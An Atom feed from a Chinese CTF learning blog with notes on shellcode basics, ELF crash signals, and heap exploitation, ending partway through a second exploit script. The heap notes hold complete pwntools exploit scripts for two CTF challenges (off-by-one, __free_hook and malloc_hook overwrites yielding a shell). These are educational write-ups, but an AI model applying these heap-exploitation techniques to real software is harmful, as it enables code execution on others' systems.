<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ixout&#39;s blog</title>
  
  
  <link href="https://ixout.github.io/atom.xml" rel="self"/>
  
  <link href="https://ixout.github.io/"/>
  <updated>2023-05-21T08:59:12.731Z</updated>
  <id>https://ixout.github.io/</id>
  
  <author>
    <name>ixout</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>shellcode编写初识</title>
    <link href="https://ixout.github.io/posts/30663/"/>
    <id>https://ixout.github.io/posts/30663/</id>
    <published>2023-05-14T14:49:49.000Z</published>
    <updated>2023-05-21T08:59:12.731Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础汇编"><a href="#基础汇编" class="headerlink" title="基础汇编"></a>基础汇编</h1><h2 id="syscall-int-0x80"><a href="#syscall-int-0x80" class="headerlink" title="syscall(~int 0x80)"></a>syscall(~int 0x80)</h2><div class="table-container"><table><thead><tr><th>function</th><th>syscall number x86_32</th><th>syscall number x86_64</th></tr></thead><tbody><tr><td>read</td><td>3</td><td>0</td></tr><tr><td>write</td><td>4</td><td>1</td></tr><tr><td>open</td><td>5</td><td>2</td></tr><tr><td>execve</td><td>11</td><td>59</td></tr></tbody></table></div><h2 id="汇编长度判断"><a href="#汇编长度判断" class="headerlink" title="汇编长度判断"></a>汇编长度判断</h2><h3 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h3><h4 id="双寄存器"><a href="#双寄存器" class="headerlink" title="双寄存器"></a>双寄存器</h4><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>mov r64,r64</td><td>3</td></tr><tr><td>mov e32,e32</td><td>2</td></tr><tr><td>mov 16,16</td><td>3</td></tr></tbody></table></div><h4 id="单寄存器"><a href="#单寄存器" class="headerlink" title="单寄存器"></a>单寄存器</h4><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>mov  r64,int32</td><td>7</td></tr><tr><td>mov r64,int64</td><td>10</td></tr><tr><td>mov r64,[r64]/mov [r64],r64</td><td>3~4</td></tr><tr><td>mov r64,[r64+0x??]/mov [r64+0x??],r64</td><td>在上基础根据??判断增加</td></tr><tr><td>mov e32,int32</td><td>5</td></tr><tr><td>mov e32,[e32]/mov [e32],e32</td><td>2~3</td></tr><tr><td>mov e32,[e32+0x??]/mov [e32+0x??],e32</td><td>在上基础根据??判断增加</td></tr></tbody></table></div><p><strong>在上基础根据??判断增加</strong>:增加规则,2个十六进制数及以下+1字节;3到8个十六进制数+4字节,再往上+8字节</p><h3 id="push-amp-pop"><a href="#push-amp-pop" class="headerlink" title="push&amp;pop"></a>push&amp;pop</h3><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>push int8</td><td>2</td></tr><tr><td>push int32/int64</td><td>5</td></tr><tr><td>push r64/e32</td><td>1</td></tr><tr><td>pop r64/e32</td><td>1</td></tr><tr><td>pop [r64]</td><td>2~3</td></tr><tr><td>pop [r64+0x??]</td><td>在上基础根据??判断增加</td></tr></tbody></table></div><h3 id="and-amp-or-amp-xor"><a href="#and-amp-or-amp-xor" class="headerlink" title="and&amp;or&amp;xor"></a>and&amp;or&amp;xor</h3><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>and/or r64,r64</td><td>3</td></tr><tr><td>and/or/xor r64,int8/int32/int64</td><td>4/6/10?</td></tr><tr><td>and/or e32,e32</td><td>2</td></tr><tr><td>and/or/xor r64,int8/int32/int64</td><td>3/6/10?</td></tr></tbody></table></div><h3 id="jmp"><a href="#jmp" class="headerlink" title="jmp"></a>jmp</h3><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>jmp r64</td><td>2</td></tr><tr><td>jmp $+0x??</td><td>视??决定,&gt;=2</td></tr></tbody></table></div><h1 id="shellcraft使用"><a href="#shellcraft使用" class="headerlink" title="shellcraft使用"></a>shellcraft使用</h1><p>pwntools自带的shell生成模块,生成的汇编代码能达到目的,但一般长度较大</p><p>shellcraft.sh()</p><p>shellcraft.read()</p><p>shellcraft.write()</p><p>shellcraft.open()</p><p> 寄存器记得加引号</p><h1 id="手搓"><a href="#手搓" class="headerlink" title="手搓"></a>手搓</h1><p>清零</p><p>syscall</p><p>int 0x80</p><p>参数布置</p><p>等等</p>]]></content>
    
    
    <summary type="html">汇编</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>elf常见运行报错</title>
    <link href="https://ixout.github.io/posts/43614/"/>
    <id>https://ixout.github.io/posts/43614/</id>
    <published>2023-05-14T08:53:43.000Z</published>
    <updated>2023-06-01T01:20:41.059Z</updated>
    
    <content type="html"><![CDATA[<h1 id="段错误"><a href="#段错误" class="headerlink" title="段错误"></a>段错误</h1><p><strong>signal: 11</strong></p><p><strong>exit code: 139</strong></p><p><strong>信号名: SIGSEGV</strong></p><p>最常见的一类错误了</p><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><ol><li><strong>访问不存在的内存地址</strong></li><li><strong>访问系统保护的内存地址</strong></li><li><strong>对内存地址进行不符合该内存地址权限的操作</strong>,例如读不可读的地址,写不可写的地址,执行不可执行的地址</li><li><strong>内存对齐问题</strong>,经常会遇到类似这样的汇编命令<code>movaps xmmword ptr [r64 + 0x??], xmm0</code>,操作涉及到xmm寄存器,属于SIMD指令,其中movaps会检查[r64 + 0x??]地址<strong>是否16字节对齐</strong>,不对齐则异常,抛出段错误.</li></ol><h1 id="Bus-error"><a href="#Bus-error" class="headerlink" title="Bus error"></a>Bus error</h1><p><strong>signal: 7</strong></p><p><strong>exit code: 135</strong></p><p><strong>信号名: SIGBUS</strong></p><h2 id="产生原因-1"><a href="#产生原因-1" class="headerlink" title="产生原因"></a>产生原因</h2><h3 id="文件映射访问异常"><a href="#文件映射访问异常" class="headerlink" title="文件映射访问异常"></a>文件映射访问异常</h3><p>这是 SIGBUS 在用户态最为常见最容易触发的情况，通常来说根本原因都是进程 mmap 了一个文件后，另外的进程把这个文件截断了，导致 mmap 出来的某些内存页超出文件的实际大小，访问那些超出的内存页就会触发 SIGBUS，具体来说有以下几种场景：</p><ol><li><p>进程 mmap 一个文件后，其它进程 truncate 该文件到更小。</p></li><li><p>动态库更新，直接 cp 覆盖。</p></li><li><p>可执行文件更新，直接 cp 覆盖。</p></li></ol><p>系统读取磁盘文件通常是按页映射到内存，出于效率考虑常常使用 copy on write 机制，所以文件映射之后，如果对应的文件 page 不存在了(truncated），也不见得会马上出问题，只有到访问时才会出错，因此有一定滞后期。</p><h3 id="访问不对齐的内存"><a href="#访问不对齐的内存" class="headerlink" title="访问不对齐的内存"></a>访问不对齐的内存</h3><p>X86 平台上访问不对齐的内存时，默认不会有问题，但用户可以手动设置 EFLAGS 把 CPU 设置为不允许非对齐的内存访问，此时如果出现不对齐的内存访问，SIGBUS 就会抛出。</p><h1 id="错误的系统调用"><a href="#错误的系统调用" class="headerlink" title="错误的系统调用"></a>错误的系统调用</h1><p><strong>signal: 31</strong></p><p><strong>exit code: 159</strong></p><p><strong>信号名: SIGSYS</strong></p><p><strong>常见在开启了seccomp的程序中,当进行了被限制的系统调用时,抛出该错误</strong></p><h1 id="定时器信号"><a href="#定时器信号" class="headerlink" title="定时器信号"></a>定时器信号</h1><p><strong>signal: 14</strong></p><p><strong>exit code: 1</strong>4</p><p><strong>信号名: SIGALRM</strong></p><p><strong>长时间未响应程序时抛出该信号</strong></p><h1 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h1><p><strong>signal: 6</strong></p><p><strong>exit code: 134</strong></p><h2 id="产生原因-2"><a href="#产生原因-2" class="headerlink" title="产生原因"></a>产生原因</h2><ol><li><strong>执行abort函数</strong></li><li>执行assert函数</li><li><strong>double free or corruption (!prev)</strong>,其实就是堆操作错误了,归根结底最后还是由<strong>abort函数触发</strong></li></ol><h1 id="信号表"><a href="#信号表" class="headerlink" title="信号表"></a>信号表</h1><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-05-14_165734.png" alt=""></p>]]></content>
    
    
    <summary type="html">经常遇见的报错</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="报错" scheme="https://ixout.github.io/tags/%E6%8A%A5%E9%94%99/"/>
    
  </entry>
  
  <entry>
    <title>堆实操学习笔记</title>
    <link href="https://ixout.github.io/posts/15815/"/>
    <id>https://ixout.github.io/posts/15815/</id>
    <published>2023-04-27T02:11:26.000Z</published>
    <updated>2023-06-20T09:19:19.905Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题录"><a href="#题录" class="headerlink" title="题录"></a>题录</h1><h2 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h2><p><strong>难度:★★</strong></p><p><strong>核心利用是off-by-one</strong></p><p>使得一个用于管理指针的chunk指向可写区域,进而达到任意写的目的</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">local_path = <span class="string">&#x27;./b00ks&#x27;</span></span><br><span class="line">io = process(local_path)</span><br><span class="line"><span class="comment"># libc = io.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.binary = local_path</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">option</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(option)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter_author_name</span>(<span class="params">author_name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(author_name)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">name_sz, name, dscr_sz, dscr</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(name_sz)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(dscr_sz)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(dscr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(idx)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, dscr</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(idx)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(dscr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printbook</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(idx):  <span class="comment">#这个循环一开始还有点疑惑不过后面发现print功能会打印所有book的信息</span></span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        bookID = <span class="built_in">int</span>(io.recvline()[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        name = io.recvline()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        dscr = io.recvline()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        author = io.recvline()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> bookID, name, dscr, author</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">author_name</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    enter_author_name(author_name)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># off by one to leak addr of book1</span></span><br><span class="line">enter_author_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)<span class="comment">#使得在打印book1地址前不会停下</span></span><br><span class="line"> </span><br><span class="line">create(<span class="string">b&#x27;64&#x27;</span>, <span class="string">b&#x27;book1&#x27;</span>, <span class="string">b&#x27;32&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)<span class="comment">#这个大小还有一些限制,这样的话刚刚好,否则可能会要填充一些padding</span></span><br><span class="line"></span><br><span class="line">bookID1, name1, dscr1, author1 = printbook(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">book1_addr = unpack(author1[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;leak book1_addr:&quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"> </span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>, <span class="string">b&#x27;135168&#x27;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)<span class="comment">#mem指针指向&#x27;/bin/sh&#x27;指针,free时用到</span></span><br><span class="line"><span class="comment">#gdb.attach(io)  </span></span><br><span class="line"><span class="comment"># construct fake book1 to leak addr of book2</span></span><br><span class="line">payload1 = pack(<span class="number">1</span>) + pack(book1_addr+<span class="number">0x70</span>) + pack(book1_addr-<span class="number">0x30</span>) + pack(<span class="number">100</span>)</span><br><span class="line"><span class="comment">#第二个pack是为了得到mmap地址</span></span><br><span class="line"><span class="comment">#第三个pack是为了使得des1指向的位置不变</span></span><br><span class="line"> </span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, payload1)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># off by null to point at fake book1</span></span><br><span class="line">change(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"> </span><br><span class="line">bookID1, name1, dscr1, author1 = printbook(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">mmap_addr = unpack(name1.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;leak mmap_addr:&quot;</span> + <span class="built_in">hex</span>(mmap_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"> </span><br><span class="line">libc_base = mmap_addr + <span class="number">0x22000</span> - <span class="number">0x10</span><span class="comment">#去头加偏移</span></span><br><span class="line">log.success(<span class="string">&quot;leak libc_base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"> </span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook_addr = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">payload2 = pack(<span class="number">1</span>) + pack(book1_addr+<span class="number">0x70</span>) + pack(free_hook_addr) + pack(<span class="number">100</span>)</span><br><span class="line"><span class="comment">#将des1指针替换为free_hook的地址,并修改其为system的地址</span></span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, payload2)</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, pack(system_addr))</span><br><span class="line"> </span><br><span class="line">delete(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>与wiki和大多数博客的不同,我做了一些调整,这个我觉得是更合理的(基于ubuntu20原装环境)</p><p><strong>小记0x1-0x3</strong></p><h2 id="v-amp-n2020招新赛simpleheap"><a href="#v-amp-n2020招新赛simpleheap" class="headerlink" title="v&amp;n2020招新赛simpleheap"></a>v&amp;n2020招新赛simpleheap</h2><p><strong>难度:★★</strong></p><p>这题难度较上一题要明显高出一截</p><p>核心利用是off-by-one以及unsortedbin attack</p><p>程序的漏洞在于其edit函数存在off-by-one，以此来修改下一个chunk的size域</p><p>并利用unsortedbin的切割特性来泄露mainarena+88,来得到libc_base</p><p>再通过伪造一个fakechunk(可写hook)到fastbins链上,使得两次分配得到该chunk并覆写mallochook和reallochook</p><p>不直接覆盖mallochook为onegadget的原因是,四个onegadget的条件都不满足,故只能通过realloc函数来调整栈帧并调用reallochook为one_gadget</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./vn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">gdb.attach(p) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">b&#x27;\xc1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"> </span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc_hook:&quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc:&quot;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#5</span></span><br><span class="line"> </span><br><span class="line">one = <span class="number">0x4527a</span></span><br><span class="line">onegadget = libc_base + one</span><br><span class="line">log.info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span> + p64(onegadget) + p64(realloc+<span class="number">12</span>) + <span class="string">b&#x27;\n&#x27;</span><span class="comment">#这两个换行很重要,没有换行就会卡住不知道为什么</span></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br><span class="line">-----------------------又或者另一个有微小差异的版本--------------------------------------</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./vn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;size?&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        r.sendafter(<span class="string">b&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">        r.sendafter(<span class="string">b&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">        r.sendafter(<span 